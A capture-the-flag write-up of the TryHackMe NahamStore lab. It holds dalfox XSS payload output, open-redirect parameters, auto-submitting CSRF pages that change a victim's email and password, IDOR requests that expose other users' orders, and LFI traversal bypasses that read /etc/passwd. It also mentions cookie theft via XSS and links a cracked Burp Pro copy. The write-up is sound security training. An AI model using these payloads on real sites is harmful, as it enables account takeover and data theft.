[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dprompt%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=print(1)>" class=dalfox></iframe>
    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=print(1)>" class=dalfox></
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dprint%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>print(1)</script>
    7 line:      <title>NahamStore - <ScRipt class=dalfox>print(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Eprint%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(1)></menu></div>
    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dalert%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
[W] Reflected Payload in HTML: name=</script><svg><script/class=dalfox>alert(1)</script>-%26apos;
    7 line:  <title>NahamStore - </script><svg><script/class=dalfox>alert(1)</script>-%26apos
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B
[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=print(1)></menu></div>
    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dprint%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
[W] Reflected Payload in HTML: name='><img/src/onerror=.1|alert`` class=dalfox>
    7 line:      <title>NahamStore - '><img/src/onerror=.1|alert`` class=dalfox></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<sVg/onload=prompt(1) class=dalfox>headless
    7 line:      <title>NahamStore - <sVg/onload=prompt(1) class=dalfox></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprompt%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=alert(1)>eadless
    7 line:      <title>NahamStore - <xmp><p title="</xmp><svg/onload=alert(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert%281%29%3E
[W] Reflected Payload in HTML: name="><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
    7 line:  <title>NahamStore - "><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE></ti
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1) class=dalfox>
    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=prompt.valueOf()(1) class=d
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt.valueOf%28%29%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=</ScriPt><sCripT id=dalfox>alert(1)</sCriPt>dless
    7 line:      <title>NahamStore - </ScriPt><sCripT id=dalfox>alert(1)</sCriPt></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3C%2FScriPt%3E%3CsCripT+id%3Ddalfox%3Ealert%281%29%3C%2FsCriPt%3E
[W] Reflected Payload in HTML: name="><d3"<"/onclick=" class=dalfox>[confirm``]"<">z
    7 line:      <title>NahamStore - "><d3"<"/onclick=" class=dalfox>[confirm``]"<">z</title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:print(1)></iFramE>
    7 line:      <title>NahamStore - <iFrAme/src=jaVascRipt:print(1)></iFramE></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprint%281%29%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name="><script y="><">/*<script* */prompt()</scriptess
    7 line:      <title>NahamStore - "><script y="><">/*<script* */prompt()</script</title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cscript+y%3D%22%3E%3C%22%3E%2F%2A%3Cscript%2A+%2A%2Fprompt%28%29%3C%2Fscript
[W] Reflected Payload in HTML: name=<sVg/onload=alert(1) class=dalfox>aiting headless
    7 line:      <title>NahamStore - <sVg/onload=alert(1) class=dalfox></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<ScRipt>prompt(1)</script> waiting headless
    7 line:      <title>NahamStore - <ScRipt>prompt(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Eprompt%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=alert.bind()(1) class=dalfox>
    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=alert.bind()(1) class=dalfo
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert.bind%28%29%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<audio controls ondurationchange=prompt.valueOf()(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
    7 line:  <title>NahamStore - <audio controls ondurationchange=prompt.valueOf()(1) id=dalf
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dprompt.valueOf%28%29%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox></iFramE>
    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox></iFramE
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert.bind%28%29%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name=<ScRipt>alert(1)</script>
    7 line:      <title>NahamStore - <ScRipt>alert(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Ealert%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name='"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
    7 line:  <title>NahamStore - '"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%22%3E%3Csvg%2Fclass%3Ddalfox+onload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f
[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>alert(1)</script>
    7 line:      <title>NahamStore - <ScRipt class=dalfox>alert(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name="><script/"<a"/src=data:=".<a,[].some(confirm)>ss
    7 line:      <title>NahamStore - "><script/"<a"/src=data:=".<a,[].some(confirm)></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B%5D.some%28confirm%29%3E
[W] Reflected Payload in HTML: name=<sVg/onload=alert.bind()(1) class=dalfox>
    7 line:      <title>NahamStore - <sVg/onload=alert.bind()(1) class=dalfox></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dalert.bind%28%29%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<dalfox class=dalfox>
    7 line:      <title>NahamStore - <dalfox class=dalfox></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdalfox+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name="><svg/class="dalfox"onLoad=alert(1)>ing headless
    7 line:      <title>NahamStore - "><svg/class="dalfox"onLoad=alert(1)></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%281%29%3E
[W] Reflected Payload in HTML: name='"><img/src/onerror=.1|alert`` class=dalfox>
    7 line:      <title>NahamStore - '"><img/src/onerror=.1|alert`` class=dalfox></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name="><img/src/onerror=.1|alert``>nd waiting headless
    7 line:      <title>NahamStore - "><img/src/onerror=.1|alert``></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E
[W] Reflected Payload in HTML: name="><iFrAme/src=jaVascRipt:alert(1)></iFramE>adless
    7 line:      <title>NahamStore - "><iFrAme/src=jaVascRipt:alert(1)></iFramE></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name='><a href='javascript&colon;alert(1)'>click
    7 line:      <title>NahamStore - '><a href='javascript&colon;alert(1)'>click</title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3Ca+href%3D%27javascript%26colon%3Balert%281%29%27%3Eclick
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:prompt(1)></iFramE>s
    7 line:      <title>NahamStore - <iFrAme/src=jaVascRipt:prompt(1)></iFramE></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt%281%29%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name=<audio controls ondurationchange=prompt(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
    7 line:  <title>NahamStore - <audio controls ondurationchange=prompt(1) id=dalfox><source
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dprompt%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>alert.bind()(1)</script>less
    7 line:      <title>NahamStore - <ScRipt class=dalfox>alert.bind()(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Ealert.bind%28%29%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name=<audio controls ondurationchange=print(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
    7 line:  <title>NahamStore - <audio controls ondurationchange=print(1) id=dalfox><source 
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dprint%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
[*] ---------------------------------------------------------------------------------------------------------------------------------
[*] [duration: 40.708454296s][issues: 107] Finish Scan!

http://nahamstore.thm/product?added=1&discount=%22onpointerenter%3Dconfirm.call%28null%2C1%29+class%3Ddalfox+&id=2

http://nahamstore.thm/product?added=1&discount=%22onpointerenter%3Dconfirm.call(null%2Cdocument.domain)+class%3Ddalfox+&id=2

or using payloads from https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

like this

http://nahamstore.thm/product?added=1&discount=%22%3Csvg/onload=alert(%27XSS%27)%3E

http://nahamstore.thm/product?added=1&discount=%3Cdiv%20onpointerover=%22alert(document.domain)%22%3EMOVE%20HERE%3C/div%3E

and so on  (hidden parameter was discount)

http://nahamstore.thm/hi

Page Not Found

Sorry, we couldn't find /hi anywhere

nahamstore.thm/<script>alert(document.domain)</script>

nahamstore.thm

I've found another in auth parameter

<p class="text-center">Sorry, we couldn't find /returns/3?auth=<script>alert(window.origin)</script> anywhere</p>

http://nahamstore.thm/returns/3?auth=<script>alert(window.origin)</script>

http://nahamstore.thm

Was really fun :)

```

![[Pasted image 20230320164607.png]]

Enter an URL ( including parameters ) of an endpoint that is vulnerable to XSS  

	*http://marketing.nahamstore.thm/?error*

What HTTP header can be used to create a Stored XXS  

*User-Agent*

What HTML tag needs to be escaped on the product page to get the XSS to work?  

*title*

What JavaScript variable needs to be escaped to get the XSS to work?  

*search*

What hidden parameter can be found on the shop home page that introduces an XSS vulnerability.  

*q*

What HTML tag needs to be escaped on the returns page to get the XSS to work?  

*textarea*

What is the value of the H1 tag of the page that uses the requested URL to create an XSS  

*Page Not Found*

What other hidden parameter can be found on the shop which can introduce an XSS vulnerability

*discount*

### Open Redirect

Find two URL parameters that produce an Open Redirect  

Answer the questions below

```
┌──(witty㉿kali)-[~/bug_hunter/XSStrike]
└─$ arjun -u http://nahamstore.thm/
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[+] Heuristic scanner found 1 parameter: q
[*] Logicforcing the URL endpoint
[✓] parameter detected: r, based on: http code
[✓] parameter detected: q, based on: body length
[+] Parameters found: r, q

we found 2 params

http://nahamstore.thm/?q=https://www.google.com

https://www.google.com (written in search)

now test with r param

http://nahamstore.thm/?r=https://www.google.com

we were redirected to google :)

http://nahamstore.thm/account/addressbook?redirect_url=/basket

look here redirect_url let's test

http://nahamstore.thm/account/addressbook?redirect_url=https://www.google.com

after pressing add address

we were redirected to google :)

here the same at the time of register and login

http://nahamstore.thm/register?redirect_url=/basket

http://nahamstore.thm/register?redirect_url=https://www.google.com

works (in order to work just need to enter first http://nahamstore.thm/register?redirect_url=https://www.google.com then fill in the fields then press register)

http://nahamstore.thm/login?redirect_url=/basket

http://nahamstore.thm/login?redirect_url=https://www.google.com

works (in order to work just need to enter first http://nahamstore.thm/login?redirect_url=https://www.google.com then fill in the fields then press register)


```

Open Redirect One  

*r*

Open Redirect Two

*redirect_url*

### CSRF

It's possible to change other users data just by getting them to visit a website you've crafted. Explore the web apps forms to find what could be vulnerable to a CSRF attack.  

Answer the questions below

```
First we need to sign in and look for change email or pass and see if there's a CRRF token


http://nahamstore.thm/account/settings
http://nahamstore.thm/account/settings/email
Email Changed


let's intercept with burp

POST /account/settings/email HTTP/1.1

Host: nahamstore.thm


Upgrade-Insecure-Requests: 1

csrf_protect=eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpjNU5ERTNOVGM0SW4wPSIsInNpZ25hdHVyZSI6IjI4MzcwZDAyYmIzODc3MmQ3MTBmNTU4ODZmOWFhMzRhIn0%3D&change_email=a1%40gmail.com

we can remove csrf_protect to bypass it

like this

POST /account/settings/email HTTP/1.1

Host: nahamstore.thm
...
change_email=a12%40gmail.com

Email Changed

:)

we can also generate a PoC CSRF

<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

  <script>history.pushState('', '', '/')</script>

    <form action="http://nahamstore.thm/account/settings/email" method="POST">

      <input type="hidden" name="change&#95;email" value="a12&#64;gmail&#46;com" />

      <input type="submit" value="Submit request" />

    </form>

  </body>

</html>

In order to get burpsuite professional go to
https://github.com/SNGWN/Burp-Suite 

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ nano CSRF_poc.html
                                                                                                                                      
┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat CSRF_poc.html 
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://nahamstore.thm/account/settings/email" method="POST">
      <input type="hidden" name="change&#95;email" value="a12&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

let's create a new user 
witty@gmail.com:test1234

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ python3 -m http.server 1234                             
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...

http://10.8.19.103:1234/

Directory listing for /

    alivesubdomains.txt
    aquatone_report.html
    aquatone_session.json
    aquatone_urls.txt
    CSRF_poc.html
    final_subdomain
    headers/
    html/
    permutation_output
    permutation_output_final
    resolved_output.txt
    screenshots/
    subdomains.txt
    words.txt

after pressing CSRF_poc.html

An account with this address already exists

yep because we were already changed to this let's test with another like evil@gmail.com

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ python3 -m http.server 1234                             
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.8.19.103 - - [21/Mar/2023 13:08:17] "GET / HTTP/1.1" 200 -
10.8.19.103 - - [21/Mar/2023 13:08:19] code 404, message File not found
10.8.19.103 - - [21/Mar/2023 13:08:19] "GET /favicon.ico HTTP/1.1" 404 -
10.8.19.103 - - [21/Mar/2023 13:12:19] "GET /CSRF_poc.html HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat CSRF_poc.html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://nahamstore.thm/account/settings/email" method="POST">
      <input type="hidden" name="change&#95;email" value="evil&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.8.19.103 - - [21/Mar/2023 13:14:43] "GET / HTTP/1.1" 200 -
10.8.19.103 - - [21/Mar/2023 13:14:47] "GET /CSRF_poc.html HTTP/1.1" 200 -


Email Changed (We did it :)

and we wanna connect it again cannot cz the email witty@gmail.com is now evil@gmail.com

Invalid Email or Password combination

we can also do it with xss to steal cookies using webhook.site (check this)
https://www.youtube.com/watch?v=_lKms-iZTWc&list=LL&index=1

another way changing request method to GET (in this case not work but sometimes yep)

Hiding button (unsuspicious method)

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat CSRF_poc.html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://nahamstore.thm/account/settings/email" method="POST">
      <input type="hidden" name="change&#95;email" value="evil1&#64;gmail&#46;com" />
      <input type="submit" style="display:none" value="Submit request" />
    </form>
  </body>
  <script>document.forms[0].submit()</script>
</html>

:) un sus

Email Changed
evil@gmail.com

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.8.19.103 - - [21/Mar/2023 16:25:31] "GET / HTTP/1.1" 200 -
10.8.19.103 - - [21/Mar/2023 16:25:35] "GET /CSRF_poc.html HTTP/1.1" 200 -


Now changing pass

http://nahamstore.thm/account/settings/password

POST /account/settings/password HTTP/1.1

Host: nahamstore.thm

change_password=IbelieveinGod

Here there is not csrf token (critical vulnerability)

let's make a POC CSRF

If u haven't burp pro u can use https://github.com/merttasci/csrf-poc-generator

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat CSRF_poc_pass.html 
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://nahamstore.thm/account/settings/password" method="POST">
      <input type="hidden" name="change&#95;password" value="IbelieveinGod" />
      <input type="submit" style="display:none" value="Submit request" />
    </form>
  </body>
  <script>document.forms[0].submit()</script>
</html>


let's test it

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ python3 -m http.server 1234         
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.8.19.103 - - [21/Mar/2023 16:42:27] "GET / HTTP/1.1" 200 -
10.8.19.103 - - [21/Mar/2023 16:42:31] "GET /CSRF_poc_pass.html HTTP/1.1" 200 -


Password has been updated

Now use decoder (csrf token)

eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpjNU5ERTNOVGM0SW4wPSIsInNpZ25hdHVyZSI6IjI4MzcwZDAyYmIzODc3MmQ3MTBmNTU4ODZmOWFhMzRhIn0%3D

press smart decode and remove %3D

From base64

{"data":"eyJ1c2VyX2lkIjo0LCJ0aW1lc3RhbXAiOiIxNjc5NDE3NTc4In0=","signature":"28370d02bb38772d710f55886f9aa34aIn0

here also have base64

eyJ1c2VyX2lkIjo0LCJ0aW1lc3RhbXAiOiIxNjc5NDE3NTc4In0=

highlight it

{"data":"{"user_id":4,"timestamp":"1679417578"}","signature":"28370d02bb38772d710f55886f9aa34aIn0



```

![[Pasted image 20230321115915.png]]

![[Pasted image 20230321121231.png]]

![[Pasted image 20230321121531.png]]

What URL has no CSRF protection  

	*http://nahamstore.thm/account/settings/password*

What field can be removed to defeat the CSRF protection  

*csrf_protect*

What simple encoding is used to try and CSRF protect a form

*base64*

###  IDOR

In the web application, you'll find two IDOR vulnerabilities that allow you to read other users information.

1) An existing user has an address in New York, find the first line of the address.

2) The date and time of order ID 3  

Answer the questions below

```
My favourite vuln :)

First add to target/scope (host: nahamstore) 

GET /returns/1?auth=c4ca4238a0b923820dcc509a6f75849b HTTP/1.1

from md5 c4ca4238a0b923820dcc509a6f75849b is 1

and let's check others

GET /returns/2?auth=c81e728d9d4c2f636f067f89cc14862c HTTP/1.1

Show response in browser

Status: Awaiting Decision
Order Number: 2
Return Reason: Wrong Size

GET /returns/3?auth=eccbc87e4b5ce2fe28308fd9f2a7baf3 HTTP/1.1

HTTP/1.1 404 Not Found

uhmm seems not IDOR

let's check orders

http://nahamstore.thm/account/orders/4

GET /account/orders/5 HTTP/1.1

HTTP/1.1 302 Found  (Follow redirection press)

Id 	Order Name 	Order Items 	Order Total
00004 	Mr h1hi h1hi 	1 	15.00

is my order 4 and we don't get order 5

Request

POST /basket HTTP/1.1

Host: nahamstore.thm

address_id=1&card_no=1234123412341234

Response
HTTP/1.1 302 Found  (Follow redirection press)


Shipping Address
Mr Charles Cook
4754 Swick Hill Street
Harahan
Louisiana
70123
Order Details
Order Id: 6
Order Date: 21/03/2023 21:42:10
User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

and the others


Shipping Address
Mrs Rita Miles
3914 Charles Street
Farmington Hills
Michigan
48335
Order Details
Order Id: 7
Order Date: 21/03/2023 21:42:28
User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0


Shipping Address
Mr Jimmy Jones
3999 Clay Lick Road
Englewood
Colorado
80112
Order Details
Order Id: 8
Order Date: 21/03/2023 21:42:37
User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0


Shipping Address
Mr Jimmy Jones
160 Broadway
New York
10038
Order Details
Order Id: 9
Order Date: 21/03/2023 21:42:46
User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0


Shipping Address
Mr Charles Cook
4754 Swick Hill Street
Harahan
Louisiana
70123
Order Details
Order Id: 10
Order Date: 21/03/2023 21:42:54
User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0


Shipping Address
Mr h1hi h1hi
h1hi
h1hi
123
Order Details
Order Id: 11
Order Date: 21/03/2023 21:43:04
User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0


Shipping Address
Mrs Rita Miles
3914 Charles Street
Farmington Hills
Michigan
48335
Order Details
Order Id: 12
Order Date: 21/03/2023 21:43:33
User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

PDF Receipt (press)

http://nahamstore.thm/pdf-generator

POST /pdf-generator HTTP/1.1

Missing POST parameters

let's look source code

<form method="post" action="/pdf-generator" target="_blank">
<input type="hidden" name="what" value="order">
<input type="hidden" name="id" value="4">
<input type="submit" class="btn btn-success" value="PDF Receipt">
</form>

there are 2 params what and id

what=order&id=3

Order does not belong to this user_id

so add user_id

what=order&id=1&user_id=1

Order does not belong to this user_id (again)

what=order&id=6&user_id=6

after 4 and 5 which are my orders we can obtain other orders


Product Cost
Total $0.00
1
Order # 6
Shipping Address
Mr Charles Cook
4754 Swick Hill Street
Harahan
Louisiana
70123
Order Details
Order Id: 6
Order Date: 21/03/2023 21:42:10
[NoIcon Annotation]

Send it to intruder

what=order&id=§6§&user_id=§6§ (Using cluster bomb -- 2 payloads )

I see it need to encode it like (ctrl + u)

what=order&id=1%26user_id%3d1


Product Cost
Sticker Pack $15.00
Total $15.00
1
Order # 1
Shipping Address
Rita Miles
3914 Charles Street
Farmington Hills
Michigan
48335
Order Details
Order Id: 1
Order Date: 22/02/2021 11:42:13
[NoIcon Annotation]

what=order&id=2%26user_id%3d2

Order does not belong to this user_id

what=order&id=3%26user_id%3d3

Product Cost
Sticker Pack $15.00
Total $15.00
1
Order # 3
Shipping Address
Charles Cook
4754 Swick Hill Street
Haran
Louisiana
70123
Order Details
Order Id: 3
Order Date: 22/02/2021 11:42:13
[NoIcon Annotation]

Using Autorize

we need to copy our cookies then create a new acc and visit the links related to the page

like this

Cookie: Insert=injected; cookie=or;
Header: here

replace with ur cookie param

Cookie: token=91f32...; session=402d...

and go to interception filters and add filter (if u added to target/scope (host: nahamstore )

and now start autorize is off (on)

bypassed means vuln found and enforced not

Modified Reponse, Original Response (the same), Unauthenticated Response (not the same) vuln

Uhmm from our results we didn't find bypass even though there say bypassed

Btw
we also found at first task in another subdomain


```

![[Pasted image 20230321183240.png]]

First Line of Address  

*160 Broadway*

Order ID 3 date and time

*22/02/2021 11:42:13*

### Local File Inclusion

Somewhere in the application is an endpoint which allows you to read local files. We've placed a document at /lfi/flag.txt for you to find the contents.  

Answer the questions below

```
Check endpoints of images

open image in a new tab

http://nahamstore.thm/product/picture/?file=cbf45788a7c3ff5c2fab3cbe740595d4.jpg

GET /product/picture/?file=../../../../../etc/passwd HTTP/1.

File does not exist

bypassing

GET /product/picture/?file=....//....//....//....//....//etc/passwd HTTP/1.1

You not not have permission to view this file

check flag

GET /product/picture/?file=....//....//....//....//....//lfi/flag.txt HTTP/1.1

{7ef60e74b711f4c3a1fdf5a131ebf863}

using ffuf

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ locate LFI    
/usr/share/seclists/Fuzzing/LFI
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.tx

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://nahamstore.thm/product/picture/?file=FUZZ" -fs 19

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
